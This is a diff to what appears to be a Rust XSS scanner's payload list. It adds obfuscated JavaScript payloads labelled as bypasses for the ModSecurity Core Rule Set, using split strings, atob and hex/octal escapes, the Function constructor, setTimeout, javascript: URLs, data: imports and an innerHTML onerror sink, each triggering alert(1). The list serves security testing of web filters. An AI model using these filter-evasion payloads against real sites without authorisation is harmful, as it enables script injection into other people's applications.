@@ -12,6 +12,12 @@ pub const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
     "globalThis.alert(1)",           // globalThis reference
     "self['ale'+'rt'](1)",           // self + string concat
     "Reflect.apply(alert,null,[1])", // Reflect API
+    // CRS bypass: avoid common keywords alert/confirm/prompt
+    "new Function('ale'+'rt(1)')()",                // Function constructor with split keyword
+    "setTimeout('ale'+'rt(1)')",                    // setTimeout with string concat
+    "window[atob('YWxlcnQ=')](1)",                  // atob-based keyword reconstruction
+    "location='javas'+'cript:ale'+'rt(1)'",         // location assignment with split
+    "Set.prototype.has.call(new Set([alert]),alert)&&alert(1)", // Set API misdirection
 ];
 
 // for inJS
@@ -34,6 +40,15 @@ pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
     "Object.values({a:alert})[0](1)",  // Object.values bypass
     "window[atob('YWxlcnQ=')](1)",     // atob bypass
     "[alert][0].call(null,1)",         // array access + call
+    // CRS bypass: string reconstruction and indirect execution
+    "new Function('\\x61lert(1)')()",                          // hex escape in Function constructor
+    "setTimeout`\\x61lert\\x281\\x29`",                        // setTimeout with hex escapes
+    "setInterval(alert,0,1)",                                  // setInterval alternative
+    "Reflect.construct(Function,['ale'+'rt(1)'])()",           // Reflect.construct
+    "location='javas'+'cript:%61lert(1)'",                     // location with hex char
+    "eval?.('\\141lert(1)')",                                  // optional chaining eval + octal
+    "import('data:text/javascript,alert(1)')",                 // dynamic import (ES module)
+    "document.body.innerHTML='<img/src=x onerror=alert(1)>'",  // innerHTML sink
 ];
 
 #[cfg(test)]
